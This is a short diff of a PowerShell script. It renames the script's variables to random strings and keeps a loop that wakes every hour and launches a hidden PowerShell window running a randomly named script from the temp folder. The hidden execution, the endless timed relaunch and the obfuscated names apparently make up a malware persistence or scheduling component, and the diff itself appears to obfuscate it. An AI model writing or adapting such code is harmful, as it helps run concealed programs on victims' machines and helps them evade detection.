@@ -1,4 +1,4 @@
-$logTimes = @(
+$sXVBOreRmL = @(
     '00:00:00',
     '01:00:00',
     '02:00:00',
@@ -25,15 +25,15 @@ $logTimes = @(
     '23:00:00'
 )
 
-$logTimes = $logTimes | Sort-Object
+$sXVBOreRmL = $sXVBOreRmL | Sort-Object
 while ($true) {
-    foreach ($t in $logTimes)
+    foreach ($HFXRGQSqlP in $sXVBOreRmL)
     {
-        if((Get-Date) -lt (Get-Date -Date $t))
+        if((Get-Date) -lt (Get-Date -Date $HFXRGQSqlP))
         {
-            while ((Get-Date -Date $t) -gt (Get-Date))
+            while ((Get-Date -Date $HFXRGQSqlP) -gt (Get-Date))
             {
-              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
+              (Get-Date -Date $HFXRGQSqlP) - (Get-Date) | Start-Sleep
             }
             powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/KHRgMHYmdT.ps1"
         }
